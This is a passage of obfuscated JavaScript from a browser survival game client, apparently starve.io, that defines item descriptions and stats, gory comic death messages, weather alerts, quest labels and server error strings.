			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆⲆ] = ["Diamond Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 2, Animals Defense: 8"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔΔΔ] = ["Amethyst Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 5, Animals Defense: 13"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔᐃ] = ["Reidite Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 6, Animals Defense: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃᐃ] = ["Reidite", "The ultimate ore"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = ["Dragon Cube", "You feel a great power emanating from this cube"];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ᐃᐃΔᐃ[23] = ["The heat makes you suffocate, you can see your skin fall apart. You're charred. The grilled marshmallow has never been so tasty."];
			ᐃᐃΔᐃ[24] = ["Your vital organs melt inside, fortunately the toxic gases that escape from the lava make you faint and you do not feel the excruciating pain of death."];
			ᐃᐃΔᐃ[25] = ["The Will-O'-The-Wisp devoured you from the inside with its fiery flames."];
			ᐃᐃΔᐃ[26] = ["Oh my God, you died in indescribable pain. Even Lapa turned his head not to see this massacre."];
			ᐃᐃΔᐃ[27] = ['You were trampled by that boar. From now on, your new nickname is "the doormat".'];
			ᐃᐃΔᐃ[28] = ['With a force of 3300 newtons, the shock wave from the closing of the crab king\'s claw made you explode your heart from the inside. In addition, the crab has eaten you by sharing your remains with its other small crabs. All dance in joy around your corpse by performing a singular dance called the "crab rave"'];
			ᐃᐃΔᐃ[29] = ["Even if it is a baby, under the heat of the flames of this cute dragon, you become a delicious dish."];
			ᐃᐃΔᐃ[30] = ["Under its cute fake looks, the lava baby dismembers you so quickly that you don't have your life flashes before your eyes."];
			ᐃᐃΔᐃ[31] = ["The hawk slashed both your eyes out. Terrified, you try to escape by crawling and screaming in pain. Unfortunately the hawk catches you and takes you to distant skies that we already know will never see you again."];
			ᐃᐃΔᐃ[32] = ["Believing you saw an oasis, you dived into this tree that seemed to you to be full of juicy fruit. Unfortunately, these shiny fruits were in fact horribly painful thorns. Now stuck to the cactus, exhausted by the desert, you have fainted forever."];
			ᐃᐃΔᐃ[33] = ["That vulture had been spying on you for a long time. He was waiting for a moment of fragility from you. Once cornered by this harassing desert, barely able to breathe, the vulture twisted on you and in a flash ripped out your last hope. At your last breath, you could still see the vulture plunge his head into what was left of your body to enjoy your entrails."];
			ᐃᐃΔᐃ[34] = ["Out of nowhere, the sand worm devours you in a terrifying howl. But why did Lapa bring such a despicable monster to life?"];
			ᐃᐃΔᐃ[35] = ["Exhausted by so much heat. You would like to cry, but the sand quickly dries your tears. You suffocate, sand enters your mouth, the thumping sound of the sandstorm will be the last thing you will hear... Next time, use a turban or protect yourself under a roof"];
			ᐃᐃΔᐃ[36] = ["You feel weak, your vision becomes blurry, you can feel the darkness invading your body. Your soul flies away and leaves behind a lifeless body. Your emerald machine has been destroyed."];
			ᐃᐃΔᐃ[37] = ['You hear "Avada Kedavra!" before you turn to ashes.'];
			ᐃᐃΔᐃ[38] = ["You died crushed by an angry baby mammoth."];
			ᐃᐃΔᐃ[39] = ["You were skewered by a mammoth. In the violence of the animal's charge, your heart was left hanging on the tip of the tusk. You could still see your heart beating in the open air before losing your life crushed by the mammoth's feet for good. Notice that under the pressure of the crushing your eyes have been exorbed and that the penguins use the frozen eyes of the starvers as a balloon to distract themselves."];
			ᐃᐃΔᐃ[40] = ["The blizzard storm is so intense that your frostbite causes necrosis of all your limbs. Next time protect yourself with a roof or with warmer clothes."];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⲆΔΔᐃ] = "A sandstorm is approaching in a few seconds.";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⲆΔᐃⵠᐃ] = "The sandstorm will soon stop.";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠᐃⲆΔΔ] = "A blizzard is approaching in a few seconds.";
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔⲆᐃⵠΔ] = "The blizzard will soon stop.";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[ⲆⲆⲆᐃΔ], "Gives a +10 damages bonus when holding it with", "a Crab Helmet on a Crab King", ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], "Players Defense: 5", "Animals Defense: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = " Collect 1 dragon heart inside the cave";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = "100 bread in winter, alone, without come back";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = 0; ⵠᐃ < 7; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[11] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Hand"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Dirt", "Dirty!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Sand", "I got it in my eyes!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Wood", "You can't get enough of it!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Stone", "Also called a rock"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Gold", "Be generous, give it to others"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Diamond", "What will you make with it?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Amethyst", "It's Mauve like Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Flour", "Used in cooking"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Cookie", "A sumptuous grandmother's cookie", "Food: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["A cake", "Dream cake for the gourmets", "Food: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["Raw meat", "You can cook it with a fire", "Causes food poisoning: 10", "Food: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["Cooked meat", "A rare steak, please", "Food: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["Raw fish", "I think it's still alive", "Causes food poisoning: 10", "Food: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["Cooked fish", "With lemon it's perfect", "Food: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Bread", "An excellent French bread", "It's the currency used in the market", "Food: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = [ⵠ[239], "Tastes like Krabby Patty", "Food: 100"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Candies", "Only for children!", ⵠ[57]];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Sugar cane", "Taste it, it's delicious", "Food: 100"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Garland", "Perfect decoration for roofs"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Berries Seed", "Grows into Berry", "Birth: 2min", "Growth: 55s", "Need water: 3min 20s", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Berry", "Berry tasty!", ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Wheat Seed", "Grows into Wheat", "Birth: 2min", "Growth: 16s", "Need water: 2min", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Wild Wheat", "Turns into Flour when placed in Windmill"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Pumpkin Seed", "Grows into pumpkin", "Birth: 2min 40s", "Growth: 2min", "Need water: 2min", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Pumpkin", "It reminds me of Halloween", "Food: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Garlic Seed", "Very dangerous for vampires", ⵠ[511], ⵠ[267], "Growth: 1min 10s", "Need water: 1min 40s", ⵠ[528], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Garlic", "Reduces cold", "Food: 14", "Effect: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Thorn bush Seed", "Can damage your enemies", ⵠ[511], ⵠ[267], "Growth: 15s", "Need water: 3min", ⵠ[279], ⵠ[32]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Thorn bush", "It stings!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Plot", "Seriously, use it", "With this GMO fertilizer your plants", "will growth really faster and need less water", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Ice", "Useful for making cakes and water"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Wrench", "To repair doors, walls and spike", ⵠ[313]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Wolf Fur", "Puppy? But where is Puppy?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Rabbit Fur", "That rabbit was so cute..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Pure Fur", "You're a bread factory"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Dark Fur", "You get ready to do something wrong"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Winter Fur", "These animals just wanted a hug..."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Scales", "It smells like fish!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Kraken Skin", "Weren't you too scared?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Firecamp", "Warm you up!", "Durability: 150", "Lifetime: 2min"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Big Firecamp", "Warm you up more time!", ⵠ[463], "Lifetime: 6min"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Workbench", "Very useful to craft all kinds of objects"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Cord", "Used in crafting Hats and Bag"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Diamond Cord", "Used in crafting Special Hats"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Chest", "Allows you to store items", "Durability: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Wood Sword", "Does that work?", "Damage: 12", ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Stone Sword", "Be nice to others", "Damage: 19", "Building Damage: 6"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠΔ] = ["Gold Sword", "King of the forest", "Damage: 22", "Building Damage: 7"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠᐃⵠ] = ["Diamond Sword", "You can feel the power", ⵠ[244], "Building Damage: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆΔ] = ["Pirate Sword", "Ayyyyy!", "Better range than a normal sword", ⵠ[244], "Building Damage: 8"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⲆ] = ["Amethyst Sword", "Mauve is the most beautiful color of the world", "Damage: 27", "Building Damage: 9"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆᐃⲆ] = ["Dragon Sword", "No mercy!", ⵠ[166], "Building Damage: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = ["Dragon Spear", "Kill them all!", "Damage: 22", "Building Damage: 7"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆΔⲆ] = ["Wood Pickaxe", "Can harvest only stone and wood", ⵠ[23]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⵠΔ] = ["Stone Pickaxe", "Can harvest wood, stone and gold", ⵠ[313]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠⲆ] = ["Gold Pickaxe", "Can also harvest diamond", ⵠ[574], ⵠ[127]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆΔⲆ] = ["Diamond Pickaxe", "Can also harvest amethyst", ⵠ[162], ⵠ[127]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠΔᐃ] = ["Amethyst Pickaxe", "Can also harvest reidite, looks fancy!", ⵠ[60], ⵠ[127]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⲆ] = ["Stone Hammer", ⵠ[34], "Doesn't work well on diamond or amethyst", ⵠ[313], "Building Damage: 20"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔⲆ] = ["Gold Hammer", ⵠ[34], "Doesn't work well on amethyst", ⵠ[574], "Building Damage: 30"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃⲆⵠ] = ["Diamond Hammer", ⵠ[34], ⵠ[162], "Building Damage: 40"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⲆⵠ] = ["Amethyst Hammer", ⵠ[34], ⵠ[60], "Building Damage: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⵠᐃ] = ["Super Hammer", "Have you planned to destroy the world?", "Damage: 12", "Building Damage: 95"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔⲆ] = ["Wood Spear", "Like a wooden stick, but it stings.", "Damage: 10", "Building Damage: 3"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔΔⲆ] = ["Stone Spear", "The beginning of evolution!", ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆΔⲆ] = ["Gold Spear", "Careful, it stings!", "Damage: 15", "Buildings Damage: 5"];
			ΔⵠΔ[ᐃᐃ.ΔᐃΔΔΔ] = ["Diamond Spear", "You're ready to kill a dragon", "Damage: 17", "Buildings Damage: 5"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["Amethyst Spear", "Dragons no longer frighten you", "Damage: 18", "Buildings Damage: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Stone Shovel", ⵠ[311], ⵠ[192], ⵠ[313]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Gold Shovel", ⵠ[311], ⵠ[192], ⵠ[574], "Buildings Damage: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Diamond Shovel", ⵠ[311], ⵠ[192], ⵠ[162], "Buildings Damage: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Amethyst Shovel", ⵠ[311], ⵠ[192], ⵠ[60], "Buildings Damage: 1"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Wood Helmet", "Better than nothing", "Players Defense: 1", "Animals Defense: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Stone Helmet", "You're ready for battle!", "Players Defense: 2", "Animals Defense: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Gold Helmet", "AKA the helmet of the savages", ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Diamond Helmet", "Don't brag too much", "Players Defense: 5", "Animals Defense: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Amethyst Helmet", "You're no longer afraid of anything", "Players Defense: 6", "Animals Defense: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⲆᐃ] = ["Reidite Helmet", "You no longer feel pain", "Players Defense: 7", "Animals Defense: 25"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Dragon Helmet", "You will conquer the world", "Players Defense: 8", "Animals Defense: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Explorer hat", "Animals won't pay attention to you", "but don't make noises!", ⵠ[470], "You also calm down aggressive monsters twice as fast"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["Christmas Hat", "Oh, oh, oh, Merry Christmas", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Elf Hat", "Don't let yourself be exploited, you little snow elf!", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Hood", "You're a rogue", "You can steal someone only if", "1) It's night", "2) You're not wearing anything", "3) If you haven't been touched for eight seconds", "4) You are not close a fire", "5) Your target doesn't wear a peasant outfit", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Earmuffs", "Some kind of little chapka.", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = [ⵠ[308], "Also called a coat.", "Warmer outside water and in winter"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Winter Scarf and Cap", "Very comfortable", "Very Warm"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠΔ] = ["Mammoth fur hat", "The best blizzard protection", "Very Warm"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Peasant", "Your plants grow faster", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Winter Hood", "You can steal someone only if", "- It's night", "- You're not wearing anything", "- If you haven't been touched for four seconds", "- You are not close a fire", "- Your target doesn't wear a winter peasant outfit", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Winter Peasant", "Your plants grow faster", ⵠ[470]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Diving Mask", "You are fast in the water", "Warm in water", "Players Defense: 2, Animals Defense: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Super Diving Mask", "You are very fast in the water", "Warm in water", ⵠ[284]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Dragon Orb", ⵠ[207]];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Dragon Heart", "Turns you into a Ghost on Death!", "You are a ghost for 60 seconds", "Find a resurrection stone"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Green Gemstone", "You didn't cheat, promise?"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Orange Gemstone", "Only a real pirate can find it!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Blue Gemstone", "For too kind people"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Green Crown", "You heal yourself very quickly", "Heal over time: 40", ⵠ[284]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Orange Crown", "You suddenly feel very lucky", ⵠ[284]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Blue Crown", "Once you're dead, you'll become a ghost", "Though you will lose your weapon", ⵠ[284]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Bucket", "Useful to fill a well", "One bucket is equivalent to twelve bottles"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Empty Bucket", "You need to fill this bucket near a water source"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Bottle", "Allows you to drink water anywhere", "Water: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Empty Bottle", "You can fill this bottle near a water source"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Empty Watering Can", "You must fill it with a water source to use it"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Watering Can", "Allows watering of plants", ⵠ[23]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Bag", "More space for your items!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Paper", "Used in book-crafting"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Book", "Allows to considerably reduce the time of crafting", "Must be wearing to work", ⵠ[23]];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Bandage", "Recover more quickly your life", "Heal over time: 30", "Effect: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Lock", "Allow you to lock your chest"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Lock-pick", "Allows you to unlock one chest"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = [ⵠ[534], "Allow you to create a team", "Share doors and chests", "Harmful building won't hurt your friend"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Bridge", "Very useful on water", "It allows you to drink without drowning", "Walk faster in water"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Sign", "Leave a message to others", "Durability: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Roof", "Hides you a little and warms you!", "Also protects you against sand storm"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Well", "Allows bottle filling", ⵠ[279]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Wood Wall", "It's just a wall", ⵠ[279]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Stone Wall", "It's a little more serious.", "Durability: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["Gold Wall", "Gold on your walls? It's kind of flashy.", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Diamond Wall", "So shiny, watch your eyes", "Durability: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Amethyst Wall", "You must be very scared to go out!", "Durability: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Wood Spike", "Can damage your enemies", "Damage: 10, On-Hit Damage: 2", "Durability: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Stone Spike", "I wouldn't want to be your enemy.", ⵠ[511], ⵠ[466], "Durability: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Gold Spike", "You're so cruel.", ⵠ[166], ⵠ[466], "Durability: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Diamond Spike", "You don't like to have company.", "Damage: 40", "On-Hit Damage: 4", "Durability: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Amethyst Spike", "What the hell did your neighbors do to you?", "Damage: 50", "On-Hit Damage: 4", "Durability: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Wood Door", "Can be opened or closed by you or your friends", ⵠ[279]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Stone Door", "A stronger door is more serious", "Durability: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Gold Door", 'Are you rebuilding the "el dorado?"', ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Diamond Door", "For a shining house", "Durability: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Amethyst Door", "Is your house a locked safe?", "Durability: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Furnace", "Warms you up", "It consumes wood all 5 seconds", ⵠ[279]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Windmill", "Can produce flour from wheat", "It takes 5 seconds to make Flour", "Returns points when working", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Bread Oven", "Allows bread to be made from flour", "It takes 10 seconds to make bread", "Returns points when working", ⵠ[155]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Resurrection stone", "It's magic", "Resurrect you if you're a ghost", "You will lose your weapon", "Durability: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "You cannot join this server";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Kicked: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Your key is already used by someone else";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Your key is wrong";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "You have an old version, you need to clear your cache";
			ΔⵠΔ[ⲆⲆΔ.ΔⲆΔᐃⲆⲆᐃ] = "Your client version is too recent for this server. The server is being updated";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃᐃⲆⵠⲆⲆ] = "Wrong password! To enter a password: https://starve.io/?password=...";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "There are no more new resources";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "You survived 1 day";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "You survived ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " days";
